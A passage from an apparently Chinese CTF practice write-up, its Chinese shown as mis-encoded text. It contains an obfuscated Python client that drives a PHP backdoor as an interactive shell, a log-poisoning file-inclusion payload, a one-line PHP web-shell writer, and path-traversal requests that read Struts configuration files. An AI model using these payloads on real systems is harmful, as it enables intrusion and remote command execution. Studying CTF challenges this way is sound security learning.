</span></span><span class="line"><span class="cl"><span class="n">md5tail</span> <span class="o">=</span> <span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">init2Char</span> <span class="o">+</span> <span class="n">keyf</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())[</span><span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">randAlpha</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>    <span class="c1"># $f + Â°´ÂÖÖÂ≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;$i is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">init2Char</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;md5 head: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">md5head</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;md5 tail: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">md5tail</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ‰∫§‰∫íÂºè Shell</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Âú®ÂÜôÂÖ• Payload ÂâçÂ°´ÂÖÖ‰∏Ä‰∫õÊó†ÂÖ≥Êï∞ÊçÆ</span>
</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">indexes</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">randAlpha</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">randBytesFlow</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">12</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="n">query</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>    <span class="c1"># ÁîüÊàêÊó†ÂÖ≥Êï∞ÊçÆÂπ∂Â°´ÂÖÖ</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;Before insert payload:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ÂØπ Payload ËøõË°åÂä†ÂØÜ</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>    <span class="c1"># gzcompress Êìç‰Ωú</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">loopXor</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">xorKey</span><span class="p">)</span>    <span class="c1"># Âæ™ÁéØÂºÇÊàñËøêÁÆó , PHP‰ª£Á†Å‰∏≠ÁöÑ x() ÂáΩÊï∞</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>    <span class="c1"># base64_encode ÁºñÁ†Å</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">md5head</span> <span class="o">+</span> <span class="n">payload</span>    <span class="c1">#    Âú®ÂºÄÂ§¥Ë°•ÂÖ®$h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#  ÂØπPayloadËøõË°å‰øÆÊîπ</span>
</span></span><span class="line"><span class="cl">    <span class="n">cutIndex</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payloadPieces</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">cutIndex</span><span class="p">],</span> <span class="n">payload</span><span class="p">[</span><span class="n">cutIndex</span><span class="p">:],</span> <span class="n">md5tail</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">iPiece</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">query</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">query</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">payloadPieces</span><span class="p">[</span><span class="n">iPiece</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">iPiece</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Â∞Ü Payload ‰Ωú‰∏∫Êü•ËØ¢Â≠óÁ¨¶‰∏≤ÁºñÁ†ÅÊãºÊé•Âà∞ Referer ‰∏≠</span>
</span></span><span class="line"><span class="cl">    <span class="n">referer</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;?&#39;</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;After insert payload, referer is:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">referer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ÂèëÈÄÅ HTTP GET ËØ∑Ê±Ç</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span><span class="n">acceptLangStr</span><span class="p">,</span><span class="s1">&#39;Referer&#39;</span><span class="p">:</span><span class="n">referer</span><span class="p">},</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">html</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Êé•Êî∂ÂìçÂ∫îÊï∞ÊçÆÂåÖ</span>
</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;</span><span class="si">%s</span><span class="s1">&gt;(.*)&lt;/</span><span class="si">%s</span><span class="s1">&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">xorKey</span><span class="p">,</span><span class="n">xorKey</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Â¶ÇÊûúÊ≤°ÊúâÊî∂Âà∞ÂìçÂ∫îÊï∞ÊçÆÂåÖ</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s1">&#39;Error,  no backdoor response&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Â¶ÇÊûúÊî∂Âà∞ÂìçÂ∫îÊï∞ÊçÆÂåÖ , ÂàôÂØπÂÖ∂ËøõË°åÂ§ÑÁêÜ</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>    <span class="c1"># base64_decode Ëß£Á†Å</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">loopXor</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="n">xorKey</span><span class="p">)</span>    <span class="c1"># Âæ™ÁéØÂºÇÊàñËøêÁÆó</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>   <span class="c1"># gzuncompress ËøêÁÆó</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">output</span>    <span class="c1"># ËæìÂá∫ÂìçÂ∫î‰ø°ÊÅØ</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892.png"
	width="845"
	height="147"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892_hu10729150307917029102.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892_hu1953195010200709156.png 1024w"
	loading="lazy"
	
		alt="image-20250202113745892"
	
	
		class="gallery-image" 
		data-flex-grow="574"
		data-flex-basis="1379px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681.png"
	width="569"
	height="296"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681_hu9005623295630127068.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681_hu4079191429124468502.png 1024w"
	loading="lazy"
	
		alt="image-20250202114907681"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<p>ÂæóÂà∞flag</p>
<p>ËøôÈáåËøòÊúâÈùûÈ¢ÑÊúüËß£Ôºåvar/log/nginx‰∏ãÊúâÊó•ÂøóÊñá‰ª∂ÔºåËÄå‰∏îÂâçÈù¢fileÂèÇÊï∞Â≠òÂú®Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û</p>
<p>ÂèÇËÄÉ<a class="link" href="https://blog.csdn.net/weixin_45588247/article/details/119401092"  target="_blank" rel="noopener"
    >„ÄêÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„Äë‚Äî‚ÄîÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûËøõÈò∂_Êó•ÂøóÊñá‰ª∂ÂåÖÂê´Âà©Áî®_Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û apacheÊó•Âøó-CSDNÂçöÂÆ¢</a></p>
<p>ÂÖàÂú®fileÂèÇÊï∞ÂêéÈù¢Âä†‰∏ä<code>&lt;?php phpinfo();?&gt;&amp;ext=</code>,ÁÑ∂Âêé‰ª•‰∏∫ÊµèËßàÂô®‰ºöËøõË°åurlËΩ¨Á†ÅÔºåÊàë‰ª¨bpÊäìÂåÖÊîπ‰∏∫Ê≤°ËΩ¨Á†ÅÂâçÁöÑÂÜçÊîæÂåÖ</p>
<p>Êé•ÁùÄÂú®fileÂêéÊãºÊé•logÁöÑË∑ØÂæÑ<code>..././..././..././..././/var/log/nginx/96ee3f7aa86e-access-2025-02-02.log&amp;ext=</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622.png"
	width="1279"
	height="815"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622_hu3182980517794575477.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202131629622_hu3763545552660886198.png 1024w"
	loading="lazy"
	
		alt="image-20250202131629622"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÂÜôÂÖ•Êú®È©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]) ?&gt;&#39;);?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂêåÊ†∑ÁöÑÊµÅÁ®ãÁÑ∂ÂêéËöÅÂâëËøûÊé•</p>
<h2 id="zhuanxv">Zhuanxv
</h2><p>ÁõÆÂΩïÊâ´ÊèèÊâ´Âà∞/list</p>
<p>‰∏Ä‰∏™ÁôªÂÖ•ÁïåÈù¢</p>
<p>Ê∫êÁ†Å‰∏≠bodyÊúâ‰∏Ä‰∏™urlÔºö./loadimage?fileName=web_login_bg.jpg</p>
<p>Êàë‰ª¨ËÆøÈóÆÁúãÁúãÔºå‰ºö‰∏ãËΩΩbg.jpg</p>
<p>ÈÄöËøáÁΩëÈ°µÊèí‰ª∂Êàë‰ª¨Áü•ÈÅìËøôÊòØjavaÂÜôÁöÑwebÁïåÈù¢</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954.png"
	width="601"
	height="630"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954_hu2345078099726484153.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203124908954_hu7072867273583347220.png 1024w"
	loading="lazy"
	
		alt="image-20250203124908954"
	
	
		class="gallery-image" 
		data-flex-grow="95"
		data-flex-basis="228px"
	
></p>
<p>ÈÇ£‰πàÊàë‰ª¨Â∞ùËØïËØªÂèñ‰∏Ä‰∏ãÈÖçÁΩÆÊñá‰ª∂web.xml</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">web</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ãËΩΩÂõûÊù•ÊòØÂõæÁâáÔºå‰∏¢Âà∞vscodeÊü•Áúã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">id=</span><span class="s">&#34;WebApp_9&#34;</span> <span class="na">version=</span><span class="s">&#34;2.4&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns=</span><span class="s">&#34;http://java.sun.com/xml/ns/j2ee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;display-name&gt;</span>Struts Blank<span class="nt">&lt;/display-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>struts2<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-class&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="nt">&lt;/filter-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;filter-name&gt;</span>struts2<span class="nt">&lt;/filter-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/*<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/filter-mapping&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;welcome-file-list&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;welcome-file&gt;</span>/ctfpage/index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/welcome-file-list&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;error-page&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;error-code&gt;</span>404<span class="nt">&lt;/error-code&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;location&gt;</span>/ctfpage/404.html<span class="nt">&lt;/location&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/error-page&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÁ≥ªÁªü‰ΩøÁî®‰∫Üstruts2Ê°ÜÊû∂„ÄÇ</p>
<p>struts.xmlÊòØstruts2ÁöÑÊ†∏ÂøÉÈÖçÁΩÆÊñá‰ª∂ÔºåÂú®ÂºÄÂèëËøáÁ®ã‰∏≠Âà©Áî®ÁéáÊúÄÈ´ò„ÄÇËØ•Êñá‰ª∂‰∏ªË¶ÅË¥üË¥£ÁÆ°ÁêÜÂ∫îÁî®‰∏≠ÁöÑActionÊò†Â∞ÑÔºå‰ª•ÂèäËØ•ActionÂåÖÂê´ÁöÑResultÂÆö‰πâÁ≠â„ÄÇ</p>
<p>‰∏ãÈù¢Êàë‰ª¨ËØªÂèñstruts.xmlÁúãÁúã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">struts</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE struts PUBLIC
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">        &#34;http://struts.apache.org/dtds/struts-2.3.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;struts&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;strutsenableDynamicMethodInvocation&#34;</span> <span class="na">value=</span><span class="s">&#34;false&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;struts.mapper.alwaysSelectFullNamespace&#34;</span> <span class="na">value=</span><span class="s">&#34;true&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;constant</span> <span class="na">name=</span><span class="s">&#34;struts.action.extension&#34;</span> <span class="na">value=</span><span class="s">&#34;,&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;package</span> <span class="na">name=</span><span class="s">&#34;front&#34;</span> <span class="na">namespace=</span><span class="s">&#34;/&#34;</span> <span class="na">extends=</span><span class="s">&#34;struts-default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;global-exception-mappings&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;exception-mapping</span> <span class="na">exception=</span><span class="s">&#34;java.lang.Exception&#34;</span> <span class="na">result=</span><span class="s">&#34;error&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/global-exception-mappings&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;zhuanxvlogin&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.UserLoginAction&#34;</span> <span class="na">method=</span><span class="s">&#34;execute&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;error&#34;</span><span class="nt">&gt;</span>/ctfpage/login.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;loadimage&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.DownloadAction&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span> <span class="na">type=</span><span class="s">&#34;stream&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;contentType&#34;</span><span class="nt">&gt;</span>image/jpeg<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;contentDisposition&#34;</span><span class="nt">&gt;</span>attachment;filename=&#34;bg.jpg&#34;<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;inputName&#34;</span><span class="nt">&gt;</span>downloadFile<span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;suffix_error&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/package&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;package</span> <span class="na">name=</span><span class="s">&#34;back&#34;</span> <span class="na">namespace=</span><span class="s">&#34;/&#34;</span> <span class="na">extends=</span><span class="s">&#34;struts-default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;interceptors&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor</span> <span class="na">name=</span><span class="s">&#34;oa&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.util.UserOAuth&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor-stack</span> <span class="na">name=</span><span class="s">&#34;userAuth&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;defaultStack&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;oa&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/interceptor-stack&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/interceptors&gt;</span>
